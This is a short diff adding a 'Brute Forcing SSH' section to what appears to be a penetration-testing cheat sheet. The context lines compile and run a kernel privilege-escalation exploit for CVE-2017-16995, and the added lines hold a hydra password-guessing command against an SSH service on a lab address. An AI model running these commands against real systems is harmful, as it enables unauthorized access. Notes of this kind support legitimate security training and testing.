@@ -345,3 +345,9 @@ gcc cve-2017-16995.c -o cve-2017-16995
 file cve-2017-16995
 ./cve-2017-16995
 ```
+
+#### Brute Forcing SSH
+
+```bash
+hydra -l offsec -P wordlist -s 2222 ssh://192.168.12.133
+```
